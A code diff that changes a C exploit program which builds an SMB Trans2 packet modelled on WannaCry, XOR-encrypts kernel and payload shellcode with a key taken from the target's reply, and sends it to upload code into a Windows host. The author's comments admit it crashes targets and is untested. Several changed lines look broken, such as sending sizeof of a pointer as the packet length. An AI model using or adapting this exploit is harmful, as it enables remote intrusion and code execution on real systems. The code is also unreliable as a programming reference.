@@ -5,8 +5,6 @@ WARNING: This code works for me as of March 7th 2021 but it BSODS the target
 It could be because my kernel shellcode doesn't contain the payload shellcode length after it
 
 11/8/2021: Added code to attach the shellcode length after the kernel shellcode.
-11/8/2021: Fixed the encrypted buffer length to 4179 ( send 4178 bytes & null terminate at 4179)
-11/8/2021: Code is still untested
 */
 
 #include <windows.h>
@@ -170,7 +168,7 @@ int main(int argc, char* argv[])
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
 	//this is for determining architecture
-	signature[4] = recvbuff[22];
+	//signature[4] = recvbuff[22];
 
 	//convert the signature buffer to unsigned integer 
 	memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
@@ -278,7 +276,7 @@ int main(int argc, char* argv[])
 	unsigned int TotalSizeOfPayload = 4096 ^ XorKey;
 	unsigned int ChunkSize = 4096 ^ XorKey;
 	unsigned int OffsetofChunkinPayload = 0 ^ XorKey;
-	char Parametersbuffer[13];
+	char Parametersbuffer[12];
 
 	//allocate memory for encrypted shellcode payload buffer
 	unsigned char *encrypted;
@@ -286,10 +284,9 @@ int main(int argc, char* argv[])
 
 	//initialize to 0
 	memset((unsigned char*)encrypted, 0x00, 4096);
-	encrypted[4097] = '\0';
 
 	//copy kernel shellcode to encrypted buffer
-	memcpy((unsigned char*)encrypted, kernel_shellcode, kernel_shellcode_size);
+	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);
 	
 	//add the payload shellcode length after the kernel shellcode
 	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
@@ -311,7 +308,7 @@ int main(int argc, char* argv[])
 	*/
 	
 	//copy payload shellcode to encrypted buffer
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, shellcode, payload_shellcode_size);
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, (char*)&shellcode, payload_shellcode_size);
 
 	//Xor the data buffer with the calculated key
 	xor_payload(XorKey, (unsigned char*)encrypted, 4096);
@@ -319,15 +316,14 @@ int main(int argc, char* argv[])
 	//allocate memory for the big packet
 	unsigned char* big_packet = (unsigned char*)malloc(4178+1);
 	memset((unsigned char*)big_packet, 0x00, 4178+1);
-	big_packet[4179] = '\0';
 
 	//copy wannacry skeleton packet to big Trans2 packet
-	memcpy((unsigned char*)big_packet, (char*)wannacry_Trans2_Request, 70);
+	memcpy((unsigned char*)big_packet, (char*)&wannacry_Trans2_Request, 70);
 
 	//copy XOR values to parameters buffer
-	memcpy(Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
-	memcpy(Parametersbuffer + 4, (char*)&ChunkSize, 4);
-	memcpy(Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
+	memcpy((char*)Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
+	memcpy((char*)Parametersbuffer + 4, (char*)&ChunkSize, 4);
+	memcpy((char*)Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
 
 	//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 	memcpy((unsigned char*)big_packet + 70, (char*)Parametersbuffer, 12);
@@ -340,7 +336,7 @@ int main(int argc, char* argv[])
 	memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
 
 	//send the payload
-	send(sock, (char*)big_packet, 4178, 0);
+	send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	free(encrypted);
